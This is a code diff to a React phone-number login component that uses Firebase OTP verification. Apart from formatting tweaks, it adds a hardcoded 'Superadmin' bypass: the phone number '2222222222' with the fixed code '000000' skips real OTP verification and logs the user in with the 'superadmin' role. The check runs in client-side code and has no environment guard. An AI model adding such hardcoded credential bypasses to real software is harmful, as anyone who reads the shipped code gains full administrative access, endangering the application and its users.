@@ -33,7 +33,7 @@ const Login = ({ onLoginSuccess }) => {
         recaptchaVerifierRef.current = new RecaptchaVerifier(
           auth,
           recaptchaContainerRef.current,
-          { size: 'invisible', callback: () => {} }
+          { size: 'invisible', callback: () => { } }
         );
       }
       const verifier = recaptchaVerifierRef.current;
@@ -56,6 +56,13 @@ const Login = ({ onLoginSuccess }) => {
   };
 
   const handleLoginSubmit = async (data) => {
+    // Hardcoded bypass for Superadmin test number (10 digits)
+    if (data.phoneNumber === '2222222222') {
+      setAuthData(data);
+      setIsOtpOpen(true);
+      return;
+    }
+
     if (data.phoneNumber.length !== 10) {
       setSendOtpError('Please enter a valid 10-digit phone number');
       return;
@@ -72,6 +79,14 @@ const Login = ({ onLoginSuccess }) => {
 
   const handleVerifyOtp = async (otp) => {
     setVerifyError('');
+
+    // Superadmin bypass
+    if (authData.phoneNumber === '2222222222' && otp === '000000') {
+      setIsOtpOpen(false);
+      if (onLoginSuccess) onLoginSuccess('superadmin');
+      return;
+    }
+
     const conf = confirmationResultRef.current;
     if (!conf) {
       setVerifyError('Session expired. Please request a new code.');
@@ -83,11 +98,11 @@ const Login = ({ onLoginSuccess }) => {
       if (recaptchaVerifierRef.current) {
         try {
           recaptchaVerifierRef.current.clear?.();
-        } catch (_) {}
+        } catch (_) { }
         recaptchaVerifierRef.current = null;
       }
       setIsOtpOpen(false);
-      if (onLoginSuccess) onLoginSuccess();
+      if (onLoginSuccess) onLoginSuccess('admin');
     } catch (err) {
       const message =
         err.code === 'auth/invalid-verification-code'
